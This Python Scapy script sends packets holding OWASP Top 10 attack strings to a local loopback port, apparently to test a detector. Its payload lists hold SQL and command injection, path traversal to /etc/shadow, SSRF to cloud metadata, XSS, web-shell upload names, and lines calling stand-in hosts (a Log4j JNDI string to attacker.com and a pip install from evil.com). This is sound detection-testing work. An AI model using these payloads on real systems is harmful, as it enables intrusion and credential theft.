from scapy.all import IP, ICMP, TCP, UDP, send, conf, sr1
import time
import socket
import sys
import random

# Get local machine IP - more reliable than hardcoding
LOCAL_IP = socket.gethostbyname(socket.gethostname())
LOOPBACK_IP = "127.0.0.1"
TARGET_PORT = 12345   # Use a port that's likely to be free

def send_packet_with_retry(packet, description):
    """Try sending packet to both local IP and loopback"""
    packet[IP].dst = LOOPBACK_IP
    try:
        send(packet, verbose=1)
        print(f"[+] {description} sent to {LOOPBACK_IP}:{TARGET_PORT}")
        return True
    except Exception as e:
        print(f"[-] Failed to send to {LOOPBACK_IP}: {str(e)}")
        return False

def test_connectivity():
    """Test basic connectivity first"""
    print("\nTesting basic connectivity...")
    
    print("\nTesting ICMP (ping)...")
    ping_packet = IP(dst=LOOPBACK_IP)/ICMP()
    reply = sr1(ping_packet, timeout=2, verbose=1)
    if reply:
        print("[+] ICMP test successful! Got reply from loopback")
    else:
        print("[-] ICMP test failed - no reply")

    print("\nTesting TCP...")
    tcp_packet = IP(dst=LOOPBACK_IP)/TCP(dport=TARGET_PORT, flags="S")
    reply = sr1(tcp_packet, timeout=2, verbose=1)
    if reply:
        print("[+] TCP test successful! Got reply")
    else:
        print("[-] TCP test failed - no reply")

def send_broken_access_control_tests():
    """A01:2021 - Broken Access Control Tests"""
    payloads = [
        "GET /admin/config.php?user=admin'--&password=anything HTTP/1.1",
        "GET /etc/passwd HTTP/1.1",
        "GET ../../../etc/shadow HTTP/1.1",
        "GET /.htaccess HTTP/1.1",
        "GET /wp-config.php HTTP/1.1",
        "POST /login HTTP/1.1\nContent-Type: application/json\n\n{\"query\": \"UNION ALL SELECT username, password FROM users--\"}"
    ]
    for payload in payloads:
        packet = IP(dst=LOOPBACK_IP)/TCP(dport=TARGET_PORT, sport=random.randint(1024, 65535), flags="PA")/payload
        send_packet_with_retry(packet, "Broken Access Control Test")
        time.sleep(0.5)

def send_crypto_failure_tests():
    """A02:2021 - Cryptographic Failure Tests"""
    payloads = [
        "GET /login HTTP/1.1\nAuthorization: Basic YWRtaW46cGFzc3dvcmQ=",  # base64 encoded admin:password
        "POST /api/data HTTP/1.1\nContent-Type: application/json\n\n{\"hash\": \"md5('password')\"}",
        "GET /decrypt?algorithm=rot13&data=secretdata HTTP/1.1",
        "POST /eval HTTP/1.1\n\n{\"code\": \"eval(base64_decode('payload'))\"}"
    ]
    for payload in payloads:
        packet = IP(dst=LOOPBACK_IP)/TCP(dport=TARGET_PORT, sport=random.randint(1024, 65535), flags="PA")/payload
        send_packet_with_retry(packet, "Cryptographic Failure Test")
        time.sleep(0.5)

def send_injection_tests():
    """A03:2021 - Injection Tests"""
    payloads = [
        # SQL Injection
        "GET /login?username=admin' OR '1'='1&password=anything HTTP/1.1",
        "POST /query HTTP/1.1\n\nSELECT * FROM users WHERE id = 1 OR 1=1;",
        "GET /search?q=1 UNION SELECT username,password FROM users HTTP/1.1",
        # Command Injection
        "POST /process HTTP/1.1\n\nfilename=test.jpg; cat /etc/passwd",
        "GET /ping?host=localhost | whoami HTTP/1.1",
        # NoSQL Injection
        "POST /api/find HTTP/1.1\n\n{\"$where\": \"this.password == 'password'\"}"
    ]
    for payload in payloads:
        packet = IP(dst=LOOPBACK_IP)/TCP(dport=TARGET_PORT, sport=random.randint(1024, 65535), flags="PA")/payload
        send_packet_with_retry(packet, "Injection Test")
        time.sleep(0.5)

def send_insecure_design_tests():
    """A04:2021 - Insecure Design Tests"""
    payloads = [
        "GET /admin/phpinfo.php HTTP/1.1",
        "GET /config/database.yml HTTP/1.1",
        "GET /backup/db.sql HTTP/1.1",
        "GET /install/setup.php HTTP/1.1",
        "GET /phpMyAdmin/ HTTP/1.1"
    ]
    for payload in payloads:
        packet = IP(dst=LOOPBACK_IP)/TCP(dport=TARGET_PORT, sport=random.randint(1024, 65535), flags="PA")/payload
        send_packet_with_retry(packet, "Insecure Design Test")
        time.sleep(0.5)

def send_security_misconfig_tests():
    """A05:2021 - Security Misconfiguration Tests"""
    payloads = [
        "GET / HTTP/1.1\nX-Frame-Options: DENY\nX-XSS-Protection: 0\n",
        "GET /.git/config HTTP/1.1",
        "GET /.env HTTP/1.1",
        "GET /debug.php?debug=true HTTP/1.1",
        "GET /api/v1/config HTTP/1.1\nAuthorization: Bearer default_token"
    ]
    for payload in payloads:
        packet = IP(dst=LOOPBACK_IP)/TCP(dport=TARGET_PORT, sport=random.randint(1024, 65535), flags="PA")/payload
        send_packet_with_retry(packet, "Security Misconfiguration Test")
        time.sleep(0.5)

def send_vulnerable_component_tests():
    """A06:2021 - Vulnerable Component Tests"""
    payloads = [
        "GET / HTTP/1.1\nUser-Agent: ${jndi:ldap://attacker.com/exploit}",  # Log4j
        "POST /struts2/index.action HTTP/1.1\n\ncmd=whoami",
        "GET /api/spring HTTP/1.1\nspring.cloud.config.enabled=true",
        "GET / HTTP/1.1\nUser-Agent: Apache-Struts2-REST-Plugin"
    ]
    for payload in payloads:
        packet = IP(dst=LOOPBACK_IP)/TCP(dport=TARGET_PORT, sport=random.randint(1024, 65535), flags="PA")/payload
        send_packet_with_retry(packet, "Vulnerable Component Test")
        time.sleep(0.5)

def send_auth_failure_tests():
    """A07:2021 - Authentication Failure Tests"""
    payloads = [
        "POST /login HTTP/1.1\n\nusername=admin&password=password",
        "GET /api/data HTTP/1.1\nAuthorization: Basic YWRtaW46YWRtaW4=",
        "GET /api/v1/users HTTP/1.1\nbearer: default_token",
        "POST /reset-password HTTP/1.1\n\nemail=admin@example.com"
    ]
    for payload in payloads:
        packet = IP(dst=LOOPBACK_IP)/TCP(dport=TARGET_PORT, sport=random.randint(1024, 65535), flags="PA")/payload
        send_packet_with_retry(packet, "Authentication Failure Test")
        time.sleep(0.5)

def send_software_integrity_tests():
    """A08:2021 - Software Integrity Tests"""
    payloads = [
        "POST /api/install HTTP/1.1\n\nnpm install malicious-package",
        "GET /update HTTP/1.1\n\npip install --index-url http://evil.com/simple package",
        "POST /gems HTTP/1.1\n\ngem install malicious-gem",
        "POST /composer HTTP/1.1\n\ncomposer require evil/package"
    ]
    for payload in payloads:
        packet = IP(dst=LOOPBACK_IP)/TCP(dport=TARGET_PORT, sport=random.randint(1024, 65535), flags="PA")/payload
        send_packet_with_retry(packet, "Software Integrity Test")
        time.sleep(0.5)

def send_logging_failure_tests():
    """A09:2021 - Logging Failure Tests"""
    payloads = [
        "GET /debug.php?error_reporting=-1 HTTP/1.1",
        "GET /config.php?display_errors=1 HTTP/1.1",
        "POST /api/log HTTP/1.1\n\n{\"level\": \"DEBUG\", \"message\": \"debug_backtrace()\"}",
        "GET /test.php?show_errors=true HTTP/1.1"
    ]
    for payload in payloads:
        packet = IP(dst=LOOPBACK_IP)/TCP(dport=TARGET_PORT, sport=random.randint(1024, 65535), flags="PA")/payload
        send_packet_with_retry(packet, "Logging Failure Test")
        time.sleep(0.5)

def send_ssrf_tests():
    """A10:2021 - SSRF Tests"""
    payloads = [
        "GET /api/fetch?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1",
        "POST /api/check HTTP/1.1\n\nurl=http://127.0.0.1:3306",
        "GET /proxy?url=file:///etc/passwd HTTP/1.1",
        "POST /api/fetch HTTP/1.1\n\nurl=gopher://localhost:5432/_SELECT%20*%20FROM%20users"
    ]
    for payload in payloads:
        packet = IP(dst=LOOPBACK_IP)/TCP(dport=TARGET_PORT, sport=random.randint(1024, 65535), flags="PA")/payload
        send_packet_with_retry(packet, "SSRF Test")
        time.sleep(0.5)

def send_xss_tests():
    """XSS Attack Tests"""
    payloads = [
        "GET /search?q=<script>alert(1)</script> HTTP/1.1",
        "GET /page?title=javascript:alert(document.cookie) HTTP/1.1",
        "POST /comment HTTP/1.1\n\ntext=<img src=x onerror=alert('XSS')>",
        "GET /profile?name=<svg onload=alert(1)> HTTP/1.1"
    ]
    for payload in payloads:
        packet = IP(dst=LOOPBACK_IP)/TCP(dport=TARGET_PORT, sport=random.randint(1024, 65535), flags="PA")/payload
        send_packet_with_retry(packet, "XSS Test")
        time.sleep(0.5)

def send_file_upload_tests():
    """File Upload Tests"""
    payloads = [
        "POST /upload HTTP/1.1\n\nfilename=shell.php",
        "POST /avatar HTTP/1.1\n\nfile=backdoor.jsp",
        "PUT /api/files/exploit.asp HTTP/1.1",
        "POST /upload HTTP/1.1\n\nfile=../../etc/malicious.exe"
    ]
    for payload in payloads:
        packet = IP(dst=LOOPBACK_IP)/TCP(dport=TARGET_PORT, sport=random.randint(1024, 65535), flags="PA")/payload
        send_packet_with_retry(packet, "File Upload Test")
        time.sleep(0.5)

if __name__ == "__main__":
    print("Starting comprehensive security tests...")
    print(f"Target: {LOOPBACK_IP}:{TARGET_PORT}")
    
    if sys.platform == 'win32':
        print("\nNote: On Windows, you might need to:")
        print("1. Run this script as Administrator")
        print("2. Allow loopback in Windows Firewall")
        print("3. Check if any antivirus is blocking the traffic")
    
    input("\nPress Enter to start connectivity tests...")
    test_connectivity()
    
    input("\nPress Enter to start security tests...")
    
    print("\nRunning OWASP Top 10 Tests:")
    send_broken_access_control_tests()
    send_crypto_failure_tests()
    send_injection_tests()
    send_insecure_design_tests()
    send_security_misconfig_tests()
    send_vulnerable_component_tests()
    send_auth_failure_tests()
    send_software_integrity_tests()
    send_logging_failure_tests()
    send_ssrf_tests()
    
    print("\nRunning Additional Security Tests:")
    send_xss_tests()
    send_file_upload_tests()
    
    print("\nAll tests completed!")
